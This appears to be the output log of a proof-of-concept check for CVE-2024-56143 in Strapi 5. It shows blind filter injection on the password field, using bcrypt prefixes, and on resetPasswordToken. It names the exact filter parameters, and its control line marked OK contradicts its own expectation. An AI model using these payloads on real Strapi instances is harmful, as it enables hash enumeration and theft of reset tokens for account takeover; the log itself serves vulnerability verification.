======================================================================
CVE-2024-56143 - Strapi Private Field Exposure via Document Service
Affected: Strapi 5.0.0 - 5.5.1 | Fixed: 5.5.2
======================================================================

[*] Checking if Strapi is running...
[+] Strapi is running

[*] Getting admin token...
[+] Got admin token

[*] Ensuring test user exists...
[+] Test user ready

[*] Testing blind password filter injection...
[*] (CVE-2024-56143: lookup/filter operators don't sanitize private fields)
----------------------------------------------------------------------
    Pattern '$2' (bcrypt hash prefix)
      Status: 200, Results: 1 [VULNERABLE]
    Pattern '$2a$' (bcrypt $2a variant)
      Status: 200, Results: 1 [VULNERABLE]
    Pattern '$2b$' (bcrypt $2b variant)
      Status: 200, Results: 1 [VULNERABLE]
    Pattern 'INVALID_HASH_PREFIX' (invalid hash (should return empty))
      Status: 200, Results: 1 [OK]

[*] Testing resetPasswordToken filter...
    Status: 200
    [VULNERABLE] Filter on resetPasswordToken accepted!

======================================================================
[+] RESULT: VULNERABLE - CVE-2024-56143 confirmed
[+] Attack vectors demonstrated:
    1. Blind password hash enumeration via filters[password][$contains]
    2. Reset token discovery via filters[resetPasswordToken]
[+] Impact: Attackers can enumerate bcrypt password hashes
[+]         and steal password reset tokens
======================================================================
